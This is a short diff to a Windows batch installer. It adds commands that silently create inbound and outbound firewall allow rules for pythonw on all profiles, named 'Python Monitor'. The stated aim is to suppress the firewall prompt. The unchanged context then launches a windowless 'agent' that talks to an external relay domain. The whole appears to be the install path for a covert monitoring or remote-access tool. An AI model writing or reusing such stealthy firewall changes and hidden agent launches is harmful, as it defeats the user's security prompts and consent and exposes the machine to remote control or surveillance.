@@ -40,6 +40,13 @@ if %errorlevel% neq 0 (
 :: Install dependencies
 pip install -r "%DIR%\requirements.txt" -q --no-warn-script-location
 
+:: Allow Python through Windows Firewall silently (prevents the popup)
+for /f "delims=" %%P in ('where pythonw 2^>nul') do set "PYW=%%P"
+if defined PYW (
+    netsh advfirewall firewall add rule name="Python Monitor" dir=in action=allow program="%PYW%" enable=yes profile=any >nul 2>&1
+    netsh advfirewall firewall add rule name="Python Monitor" dir=out action=allow program="%PYW%" enable=yes profile=any >nul 2>&1
+)
+
 :: Launch agent silently
 set "NORA_RELAY=https://mon.eclipselivecam.online"
 start "" /D "%DIR%" pythonw "%DIR%\app.py"
